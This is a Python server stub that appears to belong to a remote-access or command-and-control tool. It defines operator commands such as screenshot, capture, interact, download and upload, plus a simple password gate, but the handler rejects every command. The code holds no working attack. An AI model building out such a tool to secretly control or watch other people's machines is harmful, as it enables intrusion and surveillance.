from core.utils.config import CONFIG
from core.utils import common
from core.transport import tcp
from functools import wraps

printer = common.Print_str()

MAIN_COMMANDS =[
    "status",
    "list",
    "interact",
    "download",
    "upload",
    "screenshot",
    "capture",
    "exit",
    "help"
]

def auth(func):
    @wraps(func)
    def wrapper(conn, addr, *args, **kwargs):
        tcp.send_data(conn, common.banner())
        tcp.send_data(conn,printer.info(f"Server Name: {CONFIG.server_name}"))
        # tcp.send_data(conn,"username: ")
        username = tcp.recv_data(conn)
        # tcp.send_data(conn,"password: ")
        password = tcp.recv_data(conn)

        if password == CONFIG.auth.password:
            tcp.send_data(conn,printer.success(f"Authenticated as {username}"))
            return func(conn, addr, username, *args, **kwargs)
        else:
            tcp.send_data(conn,printer.fail("Authentication Failed"))

    return wrapper


@auth
def handle(conn,addr, username = "operator"):
    
    while True:
        cmd = tcp.recv_data(conn)
        print(cmd)
        if cmd is None:
            print(f"[!] Connection from {addr} closed.")
            break
        
        match cmd:
            case _:
                tcp.send_data(conn,printer.warning("Invalid input"))

